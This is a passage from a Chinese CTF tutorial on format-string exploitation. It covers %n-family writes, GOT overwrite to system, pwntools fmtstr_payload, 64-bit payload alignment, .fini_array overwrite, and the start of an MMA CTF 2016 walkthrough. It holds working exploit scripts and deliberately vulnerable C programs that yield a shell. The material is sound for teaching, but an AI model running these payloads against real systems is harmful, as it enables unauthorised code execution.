class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功 getshell！</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpijO.png" alt="8zpijO.png"></p><h1 id="n系列"><a href="#n系列" class="headerlink" title="%n系列"></a>%n系列</h1><p>当这样构造payload  在比赛或者是 实际 漏洞利用时，往往会不会成功。因为一次行传输这么大量的字节 会导致网络卡顿或者中断连接。</p><p>我们再来了解下”%n“ 格式化字符的扩展(称不上 其实，就称为一个系列吧)</p><ol><li>%n  一次性写入4个字节</li><li>%hn  一次性写入2个字节</li><li>%hhn  一次性写入1个字节</li></ol><p>这个”%n”系列的 作用就是 向 指定的地址中写入 已经输出的字节个数。<br>用 “%偏移$n”(“%偏移$hn”,”%偏移$hhn”)  用偏移控制 指定地址。</p><p>我们稍微改造下 上面的exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./fmt"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt"</span>)</span><br><span class="line">offset=7</span><br><span class="line">printf_got=elf.got['printf']<span class="comment">#0x0804a010</span></span><br><span class="line">system_plt=elf.plt['system']<span class="comment">#0x08048360</span></span><br><span class="line">print <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line">print <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#思路：向 printf_got 中 写入 system_plt</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节 覆盖成 0x60  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+1字节 覆盖成 0x83  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+2字节 覆盖成 0x04  一字节 写入 %hhn</span></span><br><span class="line"><span class="comment"># 我们把  printf_got 最低位字节+3字节 覆盖成 0x08  一字节 写入 %hhn</span></span><br><span class="line"></span><br><span class="line">payload=p32(printf_got)      <span class="comment">#0x60          # 偏移  为 7</span></span><br><span class="line">payload+=p32(printf_got+1)   <span class="comment">#0x83          # 偏移  为 8</span></span><br><span class="line">payload+=p32(printf_got+2)   <span class="comment">#0x04          # 偏移  为 9</span></span><br><span class="line">payload+=p32(printf_got+3)   <span class="comment">#0x08          # 偏移  为 10</span></span><br><span class="line"></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x60-0x4*4)+<span class="string">"c%7$hhn"</span>        <span class="comment">#0x60          # 偏移  为 7</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x83-0x60)+<span class="string">"c%8$hhn"</span>         <span class="comment">#0x83          # 偏移  为 8</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x104-0x83)+<span class="string">"c%9$hhn"</span>        <span class="comment">#0x04          # 偏移  为 9  #由于是hhn所以会被截断，只留后两位</span></span><br><span class="line">payload+=<span class="string">"%"</span>+str(0x8-0x4)+<span class="string">"c%10$hhn"</span>          <span class="comment">#0x08          # 偏移  为 10</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getshell！<br>其实 有一点疑问的 明明  printf_got，system_plt 的地址 的搞两个字节 相同，但在这题中 如果不覆盖 会失败！</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpkuD.png" alt="8zpkuD.png"></p><h1 id="pwntools之-Fmtstr"><a href="#pwntools之-Fmtstr" class="headerlink" title="pwntools之 Fmtstr"></a>pwntools之 Fmtstr</h1><p>在 pwntools 提供给了 我们一个 很方便的 类 Fmtstr，用于构造 格式化任意写 的payload<br>官方文档可见于：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>docs.pwntools.com<span class="regexp">/en/</span>stable<span class="regexp">/fmtstr.html</span></span><br></pre></td></tr></table></figure><p>最常用 功能：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">fmtstr_payload</span>(<span class="selector-tag">offset</span>, &#123;<span class="attribute">printf_got</span>:system_plt&#125;)</span><br></pre></td></tr></table></figure><p>即<br>第一个参数 为 输入的payload 的偏移，第二个参数 为一个 {} 组合，“:”前面是要覆盖地址里的内容 被覆盖为”:”后面的内容。<br>所以这题就可以这样构造：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process("./fmt")</span><br><span class="line"><span class="attribute">elf</span>=ELF("./fmt")</span><br><span class="line"><span class="attribute">offset</span>=7</span><br><span class="line"><span class="attribute">printf_got</span>=elf.got[<span class="string">'printf'</span>]#0x0804a010</span><br><span class="line"><span class="attribute">system_plt</span>=elf.plt[<span class="string">'system'</span>]#0x08048360</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>而上面 是 32 位程序，我们现在来学下 看下更加主流的 64 位程序  是如何的。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -fno-stack-protector -no-pie -o fmt fmt.c    为了调试方便，关闭canary 和pie 保护；  另外去掉 -m32 参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">        <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我门首先还是  查看 偏移：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span>.<span class="built_in">%p</span></span><br></pre></td></tr></table></figure><p>gdb 调试：</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpEHH.png" alt="8zpEHH.png"></p><p>发现，我们的payload 存放在  栈顶了，偏移难道是 0 吗，当然并不是。</p><p>但我们都知道 64 位程序 传参的时候是 从左到右 依次放入 寄存器：rdi，rsi，rdx，rcx，r8，r9 ，<br>当参数大于等于 7 的时候 后面参数会依次 从右向左 放入栈中！</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpZEd.png" alt="8zpZEd.png"></p><p>即 栈顶 存放的我们输入的payload 是作为了 printf 函数的 第7个参数，格式化字符串的第6个参数。偏移即为 6.<br>我们可以简单证明下：</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpeUA.png" alt="8zpeUA.png"></p><p>我们知道了偏移，也可以得到  printf_got,printf_plt  那么看看是否 64位 也可以 用Fmtstr 一把梭 getshell!<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>发现 并不能 这样 构造  我们可以看下 payload(以dubug 查看)<br><img src="https://s1.ax1x.com/2020/03/26/8zpm4I.png" alt="8zpm4I.png"></p><p>在 \x20\x10\x60后面的 是64位程序地址的高位 “\x00”但 “\x00”又会 是 字符串的结束符，相当于 截断了 payload。<br>使payload 失去作用。<br>于是 我们可以 调整payload，将 地址 放在 payload 的最后。由于地址中带有\x00，所以这回就不能用%hhn分段写了，因此我们的payload构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span>+str(system_plt)+<span class="string">"c%6$lln"</span>+p64(printf_got)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>gdb 查看下 是否对齐 和printf_got所在偏移</p><p><img src="https://s1.ax1x.com/2020/03/26/8zpuCt.png" alt="8zpuCt.png"></p><p>可以发现错位了 1字节 偏移为8<br>我们修正 下 payload，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(system_plt<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(printf_got)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/26/8zpK8P.png" alt="8zpK8P.png"></p><p>getsehll  成功！！！</p><p>当我们程序只能运行 一次呢，我们要怎样 gadshell 呢。<br>再无法 ROP的情况下，我们如何利用 格式化字符串 来使得程序重新 运行呢。<br>这里有个 流程表，    </p><p>main函数作为程序入口，但编译成程序的时候入口其实是start代码段。（看下面图更利于理解）start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p><p>在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。<br>（以上两行内容  来自 <a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a> ）<br><img src="https://s1.ax1x.com/2020/03/26/8zpMgf.png" alt="8zpMgf.png"></p><p>所以 如果 程序 不存在循环，我们的思路一般是，把 printf_got 给改成 system_plt, 同时 把我们可以  将.fini._arrary 中的 第一个指针 给 覆盖成 start 地址，当 程序 结束后，调用  .fini._arrary的第一个指针，便将执行流 弄到 程序在开始处，即相当于重新 执行了一次程序，但  printf_got 已经 是 system_plt 了，我们 输入 “/bin/sh\x00”就可拿到 shell。</p><p>我看到 这里时，本试图自己写个小程序</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -fno-stack-protector -no-pie -o fmt_64_2 fmt.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh\x00"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常 来想 我觉得  这样 是可以  getshell 的。</p><p>但因为 无法控制    .fini._arrary 所造内存的 RWX状态，没法 向  .fini._arrary 第一个指针里 写入  内容。  默认只可读。<br><img src="https://s1.ax1x.com/2020/03/26/8zpQv8.png" alt="8zpQv8.png"></p><p>但假设 它可写，没意外的话，以下 exp 是应该是 可以 getshell 的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./fmt_64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./fmt_64"</span>)</span><br><span class="line"><span class="comment">#offset=6</span></span><br><span class="line">printf_got=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x4005c7</span></span><br><span class="line">fini_array=<span class="number">0x600e18</span>        <span class="comment">#readelf -S fmt_64 | grep fini_array</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">backdoor is 0x4005c7</span></span><br><span class="line"><span class="string">fini_array is 0x600e18</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fini_array is "</span>+hex(fini_array)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(fini_array)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>不假设了，还是看真题吧！</p><h1 id="MMA-CTF-2nd-2016-greeting"><a href="#MMA-CTF-2nd-2016-greeting" class="headerlink" title="MMA CTF 2nd 2016-greeting"></a>MMA CTF 2nd 2016-greeting</h1><p>即 32位 的elf  文件，开启了 canary </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$file</span> <span class="string">greeting</span></span><br><span class="line"> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$checksec</span> <span class="string">greeting</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="literal">No</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>拖入 ida:<br>看下程序 流程：<br>程序大概就是我们输入等于64 个字符 到v5中，然后 将”Nice to meet you, “+我们输入的64个字符+ “:)\n” 复制到s中！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don't ignore me ;( "</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v5);    <span class="comment">//格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="comment">//这里存在 很明显的  格式化字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> __<span class="function">cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题思路：</p><ol><li>为了程序重新运行，我们将.fini_array数组的第一个元素为start地址</li><li>因为当执行过start地址后，.fini_array数组的第一个元素将不再是start地址，所以我们在将程序重新执行后，我们需要将执行过程中的一个函数的got地址改成system的plt地址，然后第二次就直接输入/bin/sh\x00 拿shell了</li></ol><p>测偏移：12<br>首先 输入 aaaa%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, I'm nao!</span><br><span class="line">Please tell me your name... aaaa<span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span class="symbol">%p..</span><span 